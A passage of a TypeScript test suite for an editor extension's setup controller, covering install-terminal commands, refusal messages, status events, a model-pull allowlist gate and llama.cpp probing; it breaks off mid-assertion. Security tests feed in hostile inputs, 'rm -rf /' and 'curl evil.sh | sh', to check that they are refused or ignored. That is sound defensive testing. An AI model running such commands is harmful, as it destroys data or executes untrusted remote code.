    const modalCall = host.calls.find((c) => c.startsWith('showModal:'));
    expect(modalCall).toContain('sudo dnf install python3.13');
    expect(modalCall).toContain("Fedora's official repository via dnf");
    expect(host.terminalsCreated).toEqual([{ name: 'Install Python', command: 'sudo dnf install python3.13' }]);
  });

  it("target:'python' on ubuntu 22.04: pre-types the versioned universe command", async () => {
    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_UBUNTU_2204 }) });
    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
    expect(result).toEqual({ ok: true });
    expect(host.terminalsCreated).toEqual([
      { name: 'Install Python', command: 'sudo apt-get update && sudo apt-get install python3.11 python3.11-venv' },
    ]);
  });

  it("target:'python' on ubuntu 26.04 (GUIDANCE plan): refused {ok:false} FAIL-CLOSED — modal never shown, terminal never created", async () => {
    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_UBUNTU_2604 }) });
    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
    expect(result.ok).toBe(false);
    expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
    expect(host.terminalsCreated).toEqual([]);
  });

  it('unknown family: pipx target refused fail-closed — no modal, no terminal', async () => {
    const { host, controller } = makeController({}, { readOsRelease: async () => ({}) });
    const result = await controller.handle('setup.openBootstrapTerminal', {});
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe(PIPX_MISSING_UNKNOWN_COPY);
    expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
    expect(host.terminalsCreated).toEqual([]);
  });

  it('containerMismatch (marker, no host os-release): refused with the §6 container note as the reason', async () => {
    const { host, controller } = makeController({}, { readOsRelease: async () => ({ containerMismatch: true }) });
    const result = await controller.handle('setup.openBootstrapTerminal', {});
    expect(result).toEqual({ ok: false, reason: CONTAINER_NOTE_COPY });
    expect(host.terminalsCreated).toEqual([]);
  });

  it('strict target validation: anything but pipx/python is refused before any engine/modal work', async () => {
    for (const target of ['rm -rf /', 'PIPX', '', 42, {}, null] as unknown[]) {
      const { host, controller } = makeController();
      const result = await controller.handle('setup.openBootstrapTerminal', { target });
      expect(result.ok, `target=${JSON.stringify(target)}`).toBe(false);
      expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
      expect(host.terminalsCreated).toEqual([]);
    }
  });

  it('SECURITY: webview-supplied command text is ignored — the terminal gets the ENGINE command', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.openBootstrapTerminal', {
      target: 'pipx',
      command: 'curl evil.sh | sh', // never trusted, never read
    });
    expect(result).toEqual({ ok: true });
    expect(host.terminalsCreated).toEqual([{ name: 'Install pipx', command: 'sudo dnf install pipx' }]);
  });

  it("trust-gate regression: untrusted refuses target:'python' with no modal/terminal/engine read", async () => {
    const { host, depCalls, controller } = makeController({ trusted: false });
    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
    expect(result.ok).toBe(false);
    expect(host.calls).toEqual([]);
    expect(depCalls).toEqual([]);
  });
});

// --- T5 C-17: handleInstall refusal reasons are §6-grade sentences -----------

describe('T5 C-17: setup.install early-return reasons are human sentences, never bare enums', () => {
  it('pipx-missing on an unknown distro -> the §6 unknown-distro sentence', async () => {
    const { controller } = makeController(
      {},
      { locatePipx: failingLocate('pipx-missing', 'no pipx'), readOsRelease: async () => ({}) },
    );
    const result = await controller.handle('setup.install', { backendId: 'hermes' });
    expect(result).toEqual({ ok: false, reason: PIPX_MISSING_UNKNOWN_COPY });
  });

  it('python-unsuitable -> the locator detail (a real sentence), not the enum', async () => {
    const detail = 'No suitable Python (>=3.11, <3.14) was found on the login-shell PATH (probed python3.13, python3.12, python3.11).';
    const { controller } = makeController({}, { locatePipx: failingLocate('python-unsuitable', detail) });
    const result = await controller.handle('setup.install', { backendId: 'hermes' });
    expect(result).toEqual({ ok: false, reason: detail });
  });
});

// --- T7 (§2.2.2): onStatusChanged — confirmed-start / failure-write / success / recheck-complete ---

describe('T7: onStatusChanged fires on confirmed-start, failure-write, success, recheck-complete (§2.2.2)', () => {
  it('never fires before the install modal resolves, and fires once right after a CONFIRM (not at latch-set)', async () => {
    const host = new FakeSetupHost();
    let resolveModal: (v: boolean) => void = () => {};
    host.showModal = () =>
      new Promise<boolean>((resolve) => {
        resolveModal = resolve;
      });
    const { deps } = makeFakeDeps();
    const controller = new SetupController(host, deps);
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));

    const resultPromise = controller.handle('setup.install', { backendId: 'hermes' });
    // Let the call reach (and await) the modal — the in-flight latch is
    // already set at this point (critic C-16: BEFORE the modal), so this
    // proves the fire is NOT wired to latch-set.
    await Promise.resolve();
    await Promise.resolve();
    expect(fires.length).toBe(0);

    resolveModal(true);
    await resultPromise;
    expect(fires.length).toBeGreaterThanOrEqual(1);
  });

  it('never fires when the install modal is declined', async () => {
    const { controller } = makeController({ modalResponses: [false] });
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));

    const result = await controller.handle('setup.install', { backendId: 'hermes' });

    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(fires.length).toBe(0);
  });

  it('fires at confirm AND at the lastAgentIssue failure-write when locatePipx reports pipx-missing', async () => {
    const { controller } = makeController({}, { locatePipx: failingLocate('pipx-missing', 'no pipx') });
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));

    const result = await controller.handle('setup.install', { backendId: 'hermes' });

    expect(result.ok).toBe(false);
    expect(fires.length).toBe(2); // 1: confirm, 2: lastAgentIssue write
  });

  it('fires at confirm AND at success (awaitingReload flip) for a full successful install', async () => {
    const { controller } = makeController();
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));

    const result = await controller.handle('setup.install', { backendId: 'hermes' });

    expect(result).toEqual({ ok: true });
    expect(fires.length).toBe(2); // 1: confirm, 2: success
  });

  it('fires exactly once when setup.recheck completes (clears a prior issue)', async () => {
    let calls = 0;
    const { controller } = makeController(
      {},
      {
        locatePipx: async (): Promise<PipxLocateResult> => {
          calls++;
          return calls === 1 ? { ok: false, reason: 'pipx-missing', detail: 'no pipx' } : OK_PIPX_LOCATE;
        },
      },
    );
    await controller.handle('setup.install', { backendId: 'hermes' });

    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));
    const result = await controller.handle('setup.recheck', {});

    expect(result).toEqual({ ok: true });
    expect(fires.length).toBe(1);
  });

  it('fires exactly once when setup.recheck completes with a continued failure', async () => {
    const { controller } = makeController(
      {},
      { locatePipx: failingLocate('python-unsuitable', 'still unsuitable') },
    );
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));

    const result = await controller.handle('setup.recheck', {});

    expect(result).toEqual({ ok: true });
    expect(fires.length).toBe(1);
  });

  it('never fires for read-only methods (status/testRemote/cancel)', async () => {
    const { controller } = makeController();
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));

    await controller.status();
    await controller.handle('setup.testRemote', { backendId: 'ollama' });
    await controller.handle('setup.cancel', { op: 'install', id: 'hermes' });

    expect(fires.length).toBe(0);
  });

  it('never fires for OTHER mutating methods (e.g. setup.setTunable) — those rely on the provider\'s unconditional post-handle push instead', async () => {
    const { controller } = makeController();
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));

    const result = await controller.handle('setup.setTunable', {
      key: 'talaria.autocomplete.debounceMs',
      value: 500,
    });

    expect(result).toEqual({ ok: true });
    expect(fires.length).toBe(0);
  });

  it('dispose() clears onStatusChanged listeners (no leak)', async () => {
    const { controller } = makeController();
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));
    controller.dispose();

    // A recheck after dispose would have fired pre-dispose — proves the
    // listener set was actually cleared, not merely unreachable.
    await controller.handle('setup.recheck', {});
    expect(fires.length).toBe(0);
  });
});

// --- T13 (beta.5 §4.4): allowlist pull gate — classification + refusal order --

// §6 copy, verbatim (drift-locked).
const HOST_SOURCED_REFUSAL_COPY =
  "Talaria never instructs Ollama to fetch from an external host — the vetted Sweep model installs through Talaria's own verified download.";
const DOWNLOAD_UNAVAILABLE_COPY =
  "No vetted build of this model is published yet — it can't be downloaded automatically. Use the guided instructions below, or the vLLM path (official release).";
const NEXT_WARNING_COPY =
  'Needs ~15 GB of GPU memory at full precision, or ~5 GB for the 4-bit build. On a CPU-only machine a 7B model produces a few tokens per second — dedicated next-edit will feel slow; the Generic mode reuses your smaller FIM model instead.';

describe('T13 classification truth table (rev 6 — the `/`-required predicate)', () => {
  // A model with NO '/' is ALWAYS a library name — dots in name/tag IRRELEVANT.
  const LIBRARY = [
    'qwen2.5-coder:1.5b-base', // the ACTUAL dotted FIM default
    'qwen3-embedding:0.6b', // the ACTUAL dotted RAG default
    'ns/name:tag', // namespaced, dotless first segment
    NEXT_DEDICATED_MODEL.ollamaCreatedName, // no '/' at all — library-shaped by construction
  ];
  // HOST-SOURCED iff '/' present AND pre-first-'/' segment is host-like
  // ('.' OR ':' OR equals 'localhost' case-insensitively).
  const HOST_SOURCED = [
    'hf.co/SyntinalCo/sweep-next-edit-v2-7B-GGUF:Q4_K_M',
    'huggingface.co/SyntinalCo/sweep-next-edit-v2-7B-GGUF', // the alias (§0.3) — same fate
    'registry.example.com/foo',
    'localhost:11434/foo',
    'LOCALHOST/foo', // case variant of the bare-localhost rule
    'HF.CO/SyntinalCo/x', // case variant — '.' detection is case-blind anyway
    NEXT_DEDICATED_MODEL.ollamaPullAlias, // the pinned manual alias itself
  ];

  for (const model of LIBRARY) {
    it(`LIBRARY: '${model}'`, () => {
      expect(isHostSourcedModel(model)).toBe(false);
    });
  }
  for (const model of HOST_SOURCED) {
    it(`HOST-SOURCED: '${model}'`, () => {
      expect(isHostSourcedModel(model)).toBe(true);
    });
  }
});

describe('T13 refusal ORDER (real registry — sha256 empty, fail-closed)', () => {
  it('(1) invalid endpoint refused FIRST — before modal, pull, verify, ingest', async () => {
    const { host, depCalls, controller } = makeController();
    const result = await controller.handle('setup.pullModel', {
      model: 'qwen2.5-coder:1.5b-base',
      endpoint: 'not-a-url',
    });
    expect(result).toEqual({ ok: false, reason: 'Enter a valid http:// or https:// URL.' });
    expect(host.calls).toEqual([]); // no modal
    expect(depCalls).toEqual([]); // no pullModel / verifyHfDigest / ingestGguf
  });

  it('(1) beats (2): bad endpoint + host-sourced model → the URL refusal, not the host-sourced copy', async () => {
    const { controller } = makeController();
    const result = await controller.handle('setup.pullModel', {
      model: 'hf.co/SyntinalCo/x',
      endpoint: 'not-a-url',
    });
    expect(result).toEqual({ ok: false, reason: 'Enter a valid http:// or https:// URL.' });
  });

  const HOST_SOURCED_VARIANTS = [
    'hf.co/SyntinalCo/sweep-next-edit-v2-7B-GGUF:Q4_K_M',
    'huggingface.co/SyntinalCo/sweep-next-edit-v2-7B-GGUF:Q4_K_M',
    'registry.example.com/foo:latest',
    'localhost:11434/foo',
    'HF.co/SyntinalCo/x:q4_k_m',
    '  hf.co/SyntinalCo/x', // leading whitespace — normalize(trim) happens BEFORE classify
    NEXT_DEDICATED_MODEL.ollamaPullAlias,
  ];
  for (const model of HOST_SOURCED_VARIANTS) {
    it(`(2) host-sourced '${model}' → ALWAYS refused with the §6 copy, before modal/pull/ingest`, async () => {
      const { host, depCalls, controller } = makeController();
      const result = await controller.handle('setup.pullModel', { model });
      expect(result).toEqual({ ok: false, reason: HOST_SOURCED_REFUSAL_COPY });
      expect(host.calls).toEqual([]);
      expect(depCalls).toEqual([]);
    });
  }

  it('(3a) vetted name with empty sha256 → download-unavailable copy; verify/modal/ingest never reached', async () => {
    const { host, depCalls, controller } = makeController();
    const result = await controller.handle('setup.pullModel', {
      model: NEXT_DEDICATED_MODEL.ollamaCreatedName,
    });
    expect(result).toEqual({ ok: false, reason: DOWNLOAD_UNAVAILABLE_COPY });
    expect(host.calls).toEqual([]);
    expect(depCalls).toEqual([]);
  });

  it('(3) vetted-name match is case-insensitive (uppercase variant hits the same (3a) refusal, not the library tier)', async () => {
    const { host, depCalls, controller } = makeController();
    const result = await controller.handle('setup.pullModel', {
      model: NEXT_DEDICATED_MODEL.ollamaCreatedName.toUpperCase(),
    });
    expect(result).toEqual({ ok: false, reason: DOWNLOAD_UNAVAILABLE_COPY });
    expect(host.calls).toEqual([]); // in particular: NOT the library pull modal
    expect(depCalls).toEqual([]);
  });

  it('(4) DOTTED library name pulls normally — byte-identical regression (modal copy + deps.pullModel, never ingest)', async () => {
    const { host, depCalls, controller } = makeController();
    const result = await controller.handle('setup.pullModel', { model: 'qwen2.5-coder:1.5b-base' });
    expect(result).toEqual({ ok: true });
    expect(host.calls).toEqual([
      "showModal:Pull model 'qwen2.5-coder:1.5b-base' from the Ollama registry to your local disk?",
    ]);
    expect(depCalls).toEqual(['pullModel']);
  });
});

describe('T13 presence wire (§4.2 — status() facts, real registry sha256=empty)', () => {
  it('ollama.endpoint carries the endpoint status() actually probed (registry default)', async () => {
    const { controller } = makeController();
    const data = await controller.status();
    expect(data.ollama.endpoint).toBe('http://127.0.0.1:11434');
  });

  it('nextEdit.dedicated: fail-closed block — downloadReady=false, R-3 empty ollama prefill, no llamacpp guided line', async () => {
    const { controller } = makeController();
    const data = await controller.status();
    expect(data.nextEdit.dedicated).toEqual({
      displayName: 'Sweep Next-Edit v2 (7B)',
      // ⚠ R-3: '' WHILE !downloadReady — an unpullable prefill would persist
      // a model that resolves to nothing. openaiCompat (official safetensors)
      // is unaffected.
      modelDefaults: { ollama: '', openaiCompat: 'sweepai/sweep-next-edit-v2-7B' },
      downloadReady: false, // sha256 === '' and NOTHING else drives this
      downloadApproxBytes: 4_680_000_000,
      warning: NEXT_WARNING_COPY,
      guided: {
        vllm: 'Run: vllm serve sweepai/sweep-next-edit-v2-7B\n(official Sweep release, ~15 GB download)',
        // llamacpp ABSENT while !downloadReady (S-F2: the -hf line is gated
        // by the same pin as the Download button).
      },
    });
  });
});

// =============================================================================
// --- T6 (beta.6): controller runtime state + wire ----------------------------
// =============================================================================

/** One macrotask turn — lets a settled probe's .then body (state write +
 *  onStatusChanged fire) run before asserting. */
const tickT6 = (): Promise<void> => new Promise((resolve) => setTimeout(resolve, 0));

// §6 copy, verbatim (drift-locked here AND used by assertions below).
const LLAMACPP_MISSING_COPY = 'llama-server was not found on your PATH. Install llama.cpp, then re-check.';
const LLAMACPP_HONEST_ABSENCE_COPY =
  'No build of this model from a verified publisher exists for llama.cpp — use it via Ollama instead.';
const LLAMACPP_SERVER_DOCS_URL = 'https://github.com/ggml-org/llama.cpp/tree/master/tools/server';
const RECHECK_SCOPE_REFUSAL = "scope must be one of 'all', 'agent', 'os', 'ollama', 'llamacpp'.";

function catalogRow(id: string): CatalogModel {
  const row = MODEL_CATALOG.find((m) => m.id === id);
  if (!row) throw new Error(`no catalog row '${id}'`);
  return row;
}

const NOT_FOUND_RESULT: LlamaCppLocateResult = { ok: false, reason: 'not-found', detail: 'clean 127 miss' };
const PROBE_TIMEOUT_RESULT: LlamaCppLocateResult = { ok: false, reason: 'probe-timeout', detail: 'shell wedged' };

describe('T6: llamacppRuntime settled-value memo (§2.5 — NOT the awaited-osResolution pattern)', () => {
  it("a probe that never resolves ⇒ status() returns binary:'checking' (and keeps returning it)", async () => {
    const { controller } = makeController();
    expect((await controller.status()).llamacppRuntime).toEqual({ binary: 'checking' });
    expect((await controller.status()).llamacppRuntime).toEqual({ binary: 'checking' });
  });

  it('the probe is kicked exactly ONCE across repeated status() calls', async () => {
    const { depCalls, controller } = makeController();
    await controller.status();
    await controller.status();
    await controller.status();
    expect(depCalls.filter((c) => c === 'locateLlamaServer').length).toBe(1);
  });

  it('settle fires onStatusChanged exactly ONCE; the settled value lands on the next status()', async () => {
    let resolveProbe: ((r: LlamaCppLocateResult) => void) | undefined;
    const { controller } = makeController(
      {},
      {
        locateLlamaServer: () =>
          new Promise<LlamaCppLocateResult>((resolve) => {
            resolveProbe = resolve;
          }),
      },
    );
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));

    expect((await controller.status()).llamacppRuntime).toEqual({ binary: 'checking' });
    expect(fires.length).toBe(0);

    resolveProbe?.({ ok: true, path: '/usr/bin/llama-server', version: 'version: b4570' });
    await tickT6();
    expect(fires.length).toBe(1);

    const data = await controller.status();
    expect(data.llamacppRuntime).toEqual({
      binary: 'found',
      version: 'version: b4570',
      path: '/usr/bin/llama-server',
    });
    await tickT6();
    expect(fires.length).toBe(1); // status() re-reads the memo — no second fire, no re-kick
  });

  it('found: the wire path is ~-redacted (the redaction discipline applies to the probe path too)', async () => {
    const { controller } = makeController(
      {},
      { locateLlamaServer: async () => ({ ok: true, path: `${homedir()}/.local/bin/llama-server` }) },
    );
    await controller.status();
    await tickT6();
    const data = await controller.status();
    expect(data.llamacppRuntime).toEqual({ binary: 'found', path: '~/.local/bin/llama-server' });
  });

  it("not-found ⇒ binary:'missing' (CC-5)", async () => {
    const { controller } = makeController({}, { locateLlamaServer: async () => NOT_FOUND_RESULT });
    await controller.status();
    await tickT6();
    expect((await controller.status()).llamacppRuntime?.binary).toBe('missing');
  });

  it("probe-timeout ⇒ binary:'unknown', NEVER 'missing', and NO install projection (CC-5)", async () => {
    const { controller } = makeController({}, { locateLlamaServer: async () => PROBE_TIMEOUT_RESULT });
    await controller.status();
    await tickT6();
    const data = await controller.status();
    expect(data.llamacppRuntime).toEqual({ binary: 'unknown' });
  });

  it("a REJECTING locateLlamaServer binding settles 'unknown' — never an unhandled rejection out of status()", async () => {
    const { controller } = makeController(
      {},
      {
        locateLlamaServer: async () => {
          throw new Error('binding exploded');
        },
      },
    );
    await controller.status();
    await tickT6();
    expect((await controller.status()).llamacppRuntime).toEqual({ binary: 'unknown' });
  });
});

describe('T6: llamacppRuntime.install projection (CC-4 — the agent.bootstrap pattern; §6 verbatim)', () => {
  async function missingOn(
    osRead: { text?: string; containerMismatch?: boolean },
  ): Promise<Awaited<ReturnType<SetupController['status']>>['llamacppRuntime']> {
    const { controller } = makeController(
      {},
      {
        locateLlamaServer: async () => NOT_FOUND_RESULT,
        readOsRelease: async () => osRead,
      },
    );
    await controller.status();
    await tickT6();
    return (await controller.status()).llamacppRuntime;
  }

  it('fedora: engine command + §6 guidance + the engine docsUrl', async () => {
    expect(await missingOn({ text: OS_FEDORA_44 })).toEqual({
      binary: 'missing',
      install: {
        command: 'sudo dnf install llama-cpp',
        guidance: LLAMACPP_MISSING_COPY,
        docsUrl: 'https://packages.fedoraproject.org/search?query=llama-cpp',
      },
    });
  });

  it('arch: engine command (--needed, no auto-confirm)', async () => {
    expect(await missingOn({ text: OS_ARCH })).toEqual({
      binary: 'missing',
      install: {
        command: 'sudo pacman -S --needed llama-cpp',
        guidance: LLAMACPP_MISSING_COPY,
        docsUrl: 'https://archlinux.org/packages/?q=llama-cpp',
      },
    });
  });

  it('suse: engine command', async () => {
    expect(await missingOn({ text: OS_TUMBLEWEED })).toEqual({
      binary: 'missing',
      install: {
        command: 'sudo zypper install llamacpp',
        guidance: LLAMACPP_MISSING_COPY,
        docsUrl: 'https://software.opensuse.org/package/llamacpp',
      },
    });
  });

  it('debian: GUIDANCE-ONLY — no command is ever guessed (the archive package name is unconfirmed)', async () => {
    expect(await missingOn({ text: OS_DEBIAN_13 })).toEqual({
      binary: 'missing',
      install: { guidance: LLAMACPP_MISSING_COPY, docsUrl: LLAMACPP_SERVER_DOCS_URL },
    });
  });

  it('unknown distro: guidance-only', async () => {
    expect(await missingOn({})).toEqual({
      binary: 'missing',
      install: { guidance: LLAMACPP_MISSING_COPY, docsUrl: LLAMACPP_SERVER_DOCS_URL },
    });
  });

  it('container degrade: the §6 container note IS the guidance (S-F10 honesty)', async () => {
    expect(await missingOn({ containerMismatch: true })).toEqual({
      binary: 'missing',
      install: { guidance: CONTAINER_NOTE_COPY, docsUrl: LLAMACPP_SERVER_DOCS_URL },
    });
  });
});

describe("T6: scoped recheck (§2.5) — {scope:'llamacpp'} re-kicks WITHOUT awaiting", () => {
  it('resolves while the probe is still pending (non-blocking), aborts the superseded probe, re-kicks, and state returns to checking', async () => {
    const signals: AbortSignal[] = [];
    let locateCalls = 0;
    const { depCalls, controller } = makeController(
      {},
      {
        locateLlamaServer: (signal?: AbortSignal) => {
          locateCalls++;
          if (signal) signals.push(signal);
          return new Promise<LlamaCppLocateResult>(() => {});
        },
      },
    );
    await controller.status(); // kick #1
    expect(locateCalls).toBe(1);

    const result = await controller.handle('setup.recheck', { scope: 'llamacpp' });
    expect(result).toEqual({ ok: true }); // resolved though the probe never settles
    expect(locateCalls).toBe(2); // re-kicked without awaiting
    expect(signals[0]?.aborted).toBe(true); // superseded probe cancelled (T5 CR-1 threading)
    expect(signals[1]?.aborted).toBe(false);
    expect(depCalls).not.toContain('locatePipx'); // scoped: the agent card is untouched
    expect((await controller.status()).llamacppRuntime).toEqual({ binary: 'checking' });
  });

  it('a superseded probe settling late is DROPPED — no state overwrite, no extra fire', async () => {
    const resolvers: Array<(r: LlamaCppLocateResult) => void> = [];
    const { controller } = makeController(
      {},
      {
        locateLlamaServer: () =>
          new Promise<LlamaCppLocateResult>((resolve) => {
            resolvers.push(resolve);
          }),
      },
    );
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));

    await controller.status(); // kick #1
    await controller.handle('setup.recheck', { scope: 'llamacpp' }); // supersede + kick #2
    expect(fires.length).toBe(1); // the recheck completion fire only

    resolvers[0]?.({ ok: true, path: '/stale/llama-server' }); // the SUPERSEDED probe settles late
    await tickT6();
    expect(fires.length).toBe(1); // dropped: no settle fire
    expect((await controller.status()).llamacppRuntime).toEqual({ binary: 'checking' });

    resolvers[1]?.(NOT_FOUND_RESULT); // the CURRENT probe settles
    await tickT6();
    expect(fires.length).toBe(2);
    expect((await controller.status()).llamacppRuntime?.binary).toBe('missing');
  });

  it("{scope:'llamacpp'} touches NOTHING else — os memo intact, pipx not relocated", async () => {
    const { depCalls, controller } = makeController();
    await controller.status();
    await controller.handle('setup.recheck', { scope: 'llamacpp' });
    await controller.status();
    expect(depCalls.filter((c) => c === 'readOsRelease').length).toBe(1); // memo NOT cleared
    expect(depCalls).not.toContain('locatePipx');
  });

  it("absent scope = 'all' (byte-compatible): relocates pipx AND re-kicks the llamacpp probe", async () => {
    const { depCalls, controller } = makeController();
    await controller.status(); // kick #1
    await controller.handle('setup.recheck', {});
    expect(depCalls).toContain('locatePipx');
    expect(depCalls.filter((c) => c === 'locateLlamaServer').length).toBe(2);
  });

  it("{scope:'agent'}: relocates pipx ONLY — no llamacpp re-kick, no os-memo clear", async () => {
    const { depCalls, controller } = makeController();
    await controller.status();
    await controller.handle('setup.recheck', { scope: 'agent' });
    await controller.status();
    expect(depCalls).toContain('locatePipx');
    expect(depCalls.filter((c) => c === 'locateLlamaServer').length).toBe(1);
    expect(depCalls.filter((c) => c === 'readOsRelease').length).toBe(1);
  });

  it("{scope:'os'}: clears the os memo ONLY — next status() re-reads os-release; pipx untouched", async () => {
    const { depCalls, controller } = makeController();
    await controller.status();
    await controller.handle('setup.recheck', { scope: 'os' });
    await controller.status();
    expect(depCalls.filter((c) => c === 'readOsRelease').length).toBe(2);
    expect(depCalls).not.toContain('locatePipx');
  });

  it("{scope:'ollama'}: fires once (repaint → fresh status re-probes the daemon); nothing else touched", async () => {
    const { depCalls, controller } = makeController();
    await controller.status();
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));
    const result = await controller.handle('setup.recheck', { scope: 'ollama' });
    expect(result).toEqual({ ok: true });
    expect(fires.length).toBe(1);
    await controller.status();
    expect(depCalls).not.toContain('locatePipx');
    expect(depCalls.filter((c) => c === 'readOsRelease').length).toBe(1);
    expect(depCalls.filter((c) => c === 'locateLlamaServer').length).toBe(1);
  });

  it('an invalid scope is REFUSED (validated enum) — nothing runs, nothing fires', async () => {
    const { depCalls, controller } = makeController();
    const fires: void[] = [];
    controller.onStatusChanged(() => fires.push(undefined));
    const result = await controller.handle('setup.recheck', { scope: 'bogus' });
    expect(result).toEqual({ ok: false, reason: RECHECK_SCOPE_REFUSAL });
    expect(depCalls).toEqual([]);
    expect(fires.length).toBe(0);
  });

  it('a non-string scope is REFUSED, not coerced to the default', async () => {
    const { controller } = makeController();
    const result = await controller.handle('setup.recheck', { scope: 42 });
    expect(result).toEqual({ ok: false, reason: RECHECK_SCOPE_REFUSAL });
  });
});

describe('T6: store scan wired + ordering (§2.5 — awaited BEFORE the CR-002 synchronous tail)', () => {
  it('status() WAITS on the scan; the same snapshot reflects its presence (resolved before the tail emitted)', async () => {
    let resolveScan: ((m: ReadonlyMap<string, boolean>) => void) | undefined;
    const { controller } = makeController(
      {},
      {
        scanStorePresence: () =>
          new Promise<ReadonlyMap<string, boolean>>((resolve) => {
            resolveScan = resolve;
          }),
      },
    );
    let settled = false;
    const pending = controller.status().then((d) => {
      settled = true;
      return d;
    });
    await tickT6();
    await tickT6();
    expect(settled).toBe(false); // status() is genuinely awaiting the scan

    resolveScan?.(new Map([['qwen25-coder-1.5b', true]]));
    const data = await pending;
    const row = data.catalog?.models.find((m) => m.id === 'qwen25-coder-1.5b');
    expect(row?.llamacpp?.present).toBe(true);
    // The CR-002 tail content is in the SAME snapshot — presence resolved first.
    expect(data.nextEdit.dedicated?.displayName).toBe('Sweep Next-Edit v2 (7B)');
  });

  it('a REJECTING scan fails CLOSED: status() still resolves, every cell reads absent', async () => {
    const { controller } = makeController(
      {},
      {
        scanStorePresence: async () => {
          throw new Error('EACCES: store unreadable');
        },
      },
    );
    const data = await controller.status();
    expect(data.catalog?.models.every((m) => m.llamacpp?.present === false)).toBe(true);
  });

  it('the scan re-runs on every status() (cheap stat pass — presence stays live)', async () => {
    const { depCalls, controller } = makeController();
    await controller.status();
    await controller.status();
    expect(depCalls.filter((c) => c === 'scanStorePresence').length).toBe(2);
  });
});

describe('T6: catalog wire rows (§1.3 — all 13 MODEL_CATALOG rows project completely)', () => {
  it('13 rows, catalog order, progressId === id on every row (rule 7: the ONE progress key)', async () => {
    const { controller } = makeController();
    const models = (await controller.status()).catalog?.models ?? [];
    expect(models.length).toBe(13);
    expect(models.map((m) => m.id)).toEqual(MODEL_CATALOG.map((m) => m.id));
    for (const m of models) expect(m.progressId).toBe(m.id);
  });

  it('exactly ONE defaultForRole per role (rev 3) — devstral/qwen1.5b/qwen-embed-0.6b/sweep', async () => {
    const { controller } = makeController();
    const models = (await controller.status()).catalog?.models ?? [];
    const defaults = models.filter((m) => m.defaultForRole === true);
    expect(defaults.map((m) => `${m.role}:${m.id}`).sort()).toEqual([
      'agent:devstral-24b',
      'embedding:qwen3-embedding-0.6b',
      'fim:qwen25-coder-1.5b',
      'next:sweep-next',
    ]);
  });

  it('library tier: ollamaTag + ollamaApproxBytes on the wire, NO createdName', async () => {
    const { controller } = makeController();
    const models = (await controller.status()).catalog?.models ?? [];
    const fim = models.find((m) => m.id === 'qwen25-coder-1.5b');
    expect(fim?.ollamaTag).toBe('qwen2.5-coder:1.5b-base');
    expect(fim?.ollamaApproxBytes).toBe(986_000_000);
    expect(fim?.ollamaCreatedName).toBeUndefined();
  });

  it('hf-ingest tier: ollamaCreatedName (LOAD-BEARING for /api/tags presence) + gguf bytes, NO tag', async () => {
    const { controller } = makeController();
    const models = (await controller.status()).catalog?.models ?? [];
    const devstral = models.find((m) => m.id === 'devstral-24b');
    expect(devstral?.ollamaCreatedName).toBe('devstral-small-2507:24b');
    expect(devstral?.ollamaApproxBytes).toBe(14_333_915_904);
    expect(devstral?.ollamaTag).toBeUndefined();
    const sweep = models.find((m) => m.id === 'sweep-next');
    expect(sweep?.ollamaCreatedName).toBe('sweep-next-edit-v2-7b:q4_k_m');
  });

  it('identity + honesty fields pass through: displayName/publisher/license/vramLine/note/contextWindow', async () => {
    const { controller } = makeController();
    const models = (await controller.status()).catalog?.models ?? [];
    const devstral = models.find((m) => m.id === 'devstral-24b');
    expect(devstral?.displayName).toBe('Devstral-24B (2507)');
    expect(devstral?.publisher).toBe('mistralai');
    expect(devstral?.license).toBe('Apache-2.0');
    expect(devstral?.contextWindow).toBe(131072);
    const sevenB = models.find((m) => m.id === 'qwen25-coder-7b');
    expect(sevenB?.contextWindow).toBeUndefined(); // absent in the catalog stays absent
    expect(sevenB?.note).toBe(
      "Base build (Q8) from ggml-org — the llama.cpp project's own packaging of Qwen's base model.",
    );
    const embedGemma = models.find((m) => m.id === 'embeddinggemma-300m');
    expect(embedGemma?.note).toBe('2K context on the Ollama build — fine for Talaria’s chunk sizes (≤512 tokens).');
  });

  it('llamacpp cells: file/bytes on all 13; available on 12; sweep-next pinned-empty ⇒ available:false; NO shipping row sets unavailableReason', async () => {
    const { controller } = makeController();
    const models = (await controller.status()).catalog?.models ?? [];
    expect(models.every((m) => m.llamacpp !== undefined)).toBe(true);
    for (const m of models) {
      expect(m.llamacpp?.unavailableReason).toBeUndefined();
      expect(m.llamacpp?.present).toBe(false); // empty scan
      expect(m.llamacpp?.available).toBe(m.id === 'sweep-next' ? false : true);
    }
    const fim = models.find((m) => m.id === 'qwen25-coder-1.5b');
    expect(fim?.llamacpp?.file).toBe('qwen2.5-coder-1.5b-q8_0.gguf');
    expect(fim?.llamacpp?.approxBytes).toBe(1_646_573_056);
  });

  it('vllm.runCommand composes on ALL 13 rows — including BOTH ledgered exception rows (SC-2)', async () => {
    const { controller } = makeController();
    const models = (await controller.status()).catalog?.models ?? [];
    for (const m of models) {
      const serveRepo = catalogRow(m.id).vllm?.serveRepo;
      expect(m.vllm?.runCommand).toBe(`vllm serve ${serveRepo}`);
    }
    expect(models.find((m) => m.id === 'gpt-oss-20b')?.vllm?.runCommand).toBe('vllm serve openai/gpt-oss-20b');
    expect(models.find((m) => m.id === 'sweep-next')?.vllm?.runCommand).toBe(
